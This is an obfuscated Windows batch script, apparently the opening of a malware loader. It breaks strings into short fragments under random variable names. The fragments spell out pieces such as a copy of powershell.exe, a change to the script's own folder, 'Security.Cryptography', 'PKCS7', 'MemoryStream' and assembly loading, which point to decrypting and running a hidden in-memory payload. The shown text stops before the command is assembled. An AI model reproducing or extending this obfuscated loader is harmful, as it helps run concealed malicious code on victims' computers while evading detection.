@echo off
set "gDLRvPmGET=st"
set "EOBKKveuTD=co"
set "nnKayLAxnJ=we"
set "cyVOpGJRrh=rs"
set "qcEzENoIUM=ll"
set "UTxlNNGGts=nd"
set "uEMDGxsiKE=Sy"
set "AHchYDOqla=po"
set "aYtlUbNQuV=we"
set "oOEaHATAZj=py"
set "cfAVJMBwVu=Po"
set "TXYeCSBeEJ=xe"
set "fmvcNMdyNN=\W"
set "vjNIrDQfkB=in"
set "nEEjbOpXUO=rS"
set "wECglUKPMg=1."
set "WoemYQdEMO=32"
set "vQitmyugHU=ow"
set "pOpiDIQrCg=s\"
set "yuMFvPBuiH=he"
set "PEqWsyArTV=\v"
set "cQhUrranmA= C"
set "ifnEyNEDVV=he"
set "LHUPOCvLSG=ws"
set "LCSVlbLoSs=.e"
set "PQOGsfDoIf=em"
set "guDMTjzUZT=ll"
set "TezFIRyzTE=do"
set "hPRxwVCQut=y "
set "kfoGDIVjUf= /"
set "xjUyFlZfEo=0\"
set "GuaQskXvBI=Wi"
set "rPuysNkekQ=:\"
set "JfKMbOtXqI=cd"
set "CApxFENRZZ= %~dp0"
set "jFaRsIYADB=pose"
set "pTlSxHwMUK=pres"
set "XbNKKftwzu=V = "
set "BGxWrKSZGg=)($l"
set "koBWMaakAQ=Star"
set "Fzrtecvcqp=.Sec"
set "YTeATbgDis=T = "
set "CHkaFOteqp=SKCA"
set "fJkZIhktwb= if "
set "VhAuqkgpcl= [Sy"
set "lcHFhZjyJV=; };"
set "PwyeNxvFrm=TWi "
set "efDQUetBHD=y.Pa"
set "McGHTkarnt=File"
set "uteUIvxtjg=.Ass"
set "cJhebdnLIn=uG.D"
set "oVWBmhJggb=th('"
set "LPuKFptBrs=eam("
set "PhwZfcUElt=oryS"
set "yfNdGQhcvi=null"
set "PlselSNjzU=Stre"
set "BUwGhfxRIX=1] -"
set "OiiztFQbQf=m.Re"
set "tfIuzqCanw=ptog"
set "PDWfASitIh= '')"
set "yuAYIqcczP=6esa"
set "LuUwJZvRyZ=$oqc"
set "EgEVWrmimn='gni"
set "XbsKXCCcWX=PKCS"
set "TlEZxzPNNY=7;$S"
set "lwSNVxAWCi=New-"
set "OiWBghOWFg=sGUc"
set "AKYTPjOnoj=LOVl"
set "WOuEtAkSAc=);$S"
set "gBSwCSPkeA=$BLO"
